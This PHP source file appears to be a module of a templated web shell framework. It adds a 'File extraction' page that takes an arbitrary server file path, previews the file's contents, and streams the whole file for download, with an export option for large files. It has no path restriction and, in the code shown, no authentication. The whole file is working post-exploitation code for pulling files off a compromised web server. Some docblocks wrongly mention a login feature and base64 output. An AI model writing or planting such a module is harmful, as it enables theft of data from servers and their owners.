<?php

// section.constants
$FILE_EXTRACTION         = "__FEAT_FILE_EXTRACTION__";
$FILE_EXTRACTION_PREVIEW = "__FEAT_FILE_EXTRACTION_PREVIEW__";
// section.constants.end

// section.functions
/**
 * Make the file extraction page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function __PREFIX__makeFileExtractionPage(&$page_content, $features, $page, $css) {
    global $FILE_EXTRACTION_PREVIEW, $FILE_EXTRACTION;
    $feature = array_values(array_filter($features, function ($feature) use ($page) {
        return $feature["op"] === $page;
    }));

    $page_content = __PREFIX__makePage(
        $features,
        $css,
        $page,
        array(
            __PREFIX__makePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            __PREFIX__makeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    __PREFIX__makeInput(
                        "text",
                        "Path",
                        "__PARAM_1__",
                        "C://path/to/file.txt",
                        "Fully qualified path to the file to extract.",
                        true,
                        "__PARAM_99__"
                    ),
                    __PREFIX__makeCheckbox(
                        "__PARAM_2__",
                        "Preview",
                        "Display preview of the file content if it's larger than 100kb.",
                        $page === $FILE_EXTRACTION_PREVIEW,
                        "y",
                        $page === $FILE_EXTRACTION_PREVIEW
                            ? "window.location.href = '?page=" . urlencode($FILE_EXTRACTION) .
                              "&__PARAM_99__=' + encodeURIComponent(document.getElementById('__PARAM_1__').value)"
                            : "window.location.href = '?page=" . urlencode($FILE_EXTRACTION_PREVIEW) .
                              "&__PARAM_99__=' + encodeURIComponent(document.getElementById('__PARAM_1__').value)"
                    ),
                    __PREFIX__makeCheckbox(
                        "__PARAM_3__",
                        "Export",
                        "Export the file even if larger than 100kb."
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the file extraction operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features container
 *
 * @return void
 */
function __PREFIX__handleFileExtraction($operation, $features) {
    $filepath = $_POST['__PARAM_1__'];
    $preview  = strtolower($_POST['__PARAM_2__']) === "y";
    $export   = strtolower($_POST['__PARAM_3__']) === "y";

    // sanitize the file path for display
    $sanitized_filepath = htmlentities($filepath);

    // check if the file exists
    if (!file_exists($filepath)) {
        echo "Error: File '$sanitized_filepath' does not exist.\n";
        return;
    }

    // get the file size
    $filesize = filesize($filepath);

    // output some file information
    echo "Reading file '$sanitized_filepath'\n";
    echo "File size: " . __PREFIX__formatBytes($filesize) . "\n";

    // if preview is enabled, read the first 10Kb of the file
    if ($preview) {
        $preview_content = fopen($filepath, "r");
        $read            = fread($preview_content, 10240); // Read 10Kb

        fclose($preview_content);

        echo "Preview:\n" . htmlentities($read) . "\n";
        return;
    }

    // if the file is less than 100Kb, read the entire file
    if ($filesize < 102400) { // Less than 100Kb
        __PREFIX__chunkedDownload($filepath, $filesize);
    }
    // if export is enabled, read the entire file even if it's larger than 100Kb
    elseif ($export) {
        __PREFIX__chunkedDownload($filepath, $filesize);
    }
    // if the file is larger than 100Kb and export is not enabled, display an error message
    else {
        echo "Error: File '$sanitized_filepath' is larger than 100kb. Use the export option to download the file.\n";
    }
}

/**
 * Hook the isolated operations to add the login operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function __PREFIX__fileExtractionHooksIsolatedOps(&$isolated_ops) {
    global $FILE_EXTRACTION;

    $isolated_ops[] = $FILE_EXTRACTION;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__fileExtractionHooksFeatures(&$features) {
    global $FILE_EXTRACTION, $FILE_EXTRACTION_PREVIEW;

    $features[] = array(
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
        "op"          => $FILE_EXTRACTION,
    );
    $features[] = array(
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg" => '',
        "hidden"      => true,
        "op"          => $FILE_EXTRACTION_PREVIEW,
    );
}

// section.functions.end

// section.hooks
add_hook("isolated_ops", "__PREFIX__fileExtractionHooksIsolatedOps");
add_hook("features", "__PREFIX__fileExtractionHooksFeatures");
add_named_hook("GET_page", $FILE_EXTRACTION, "__PREFIX__makeFileExtractionPage");
add_named_hook("GET_page", $FILE_EXTRACTION_PREVIEW, "__PREFIX__makeFileExtractionPage");
add_named_hook("POST_operation", $FILE_EXTRACTION, "__PREFIX__handleFileExtraction");
add_named_hook("POST_operation", $FILE_EXTRACTION_PREVIEW, "__PREFIX__handleFileExtraction");
// section.hooks.end